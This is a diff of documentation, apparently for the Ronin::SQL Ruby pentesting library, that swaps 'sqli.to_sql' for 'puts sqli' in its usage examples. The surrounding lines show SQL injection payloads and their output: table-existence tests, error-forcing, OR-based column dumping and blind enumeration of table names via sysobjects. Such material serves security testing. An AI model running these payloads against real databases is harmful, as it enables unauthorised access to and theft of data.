@@ -97,21 +97,21 @@ Test if a table exists:
 
     sqli = Ronin::SQL::Injection.new
     sqli.and { select(count).from(:users) == 1 }
-    puts sqli.to_sql
+    puts sqli
     # 1 AND (SELECT COUNT(*) FROM users)=1
 
 Create errors by using non-existant tables:
 
     sqli = Ronin::SQL::Injection.new(escape: :string)
     sqli.and { non_existant_table == '1' }
-    puts sqli.to_sql
+    puts sqli
     # 1' AND non_existant_table='1
 
 Dumping all values of a column:
 
     sqli = Ronin::SQL::Injection.new(escape: :string)
     sqli.or { username.is_not(null) }.or { username == '' }
-    puts sqli.to_sql
+    puts sqli
     # 1' OR username IS NOT NULL OR username='
 
 Enumerate through database table names:
@@ -126,7 +126,7 @@ Enumerate through database table names:
         )
       )
     }
-    puts sqli.to_sql
+    puts sqli
     # 1 AND ASCII(LOWER(SUBSTRING((SELECT name TOP 1 FROM sysobjects WHERE xtype='U'),1,1)))
 
 Find user supplied tables via the `sysObjects` table:
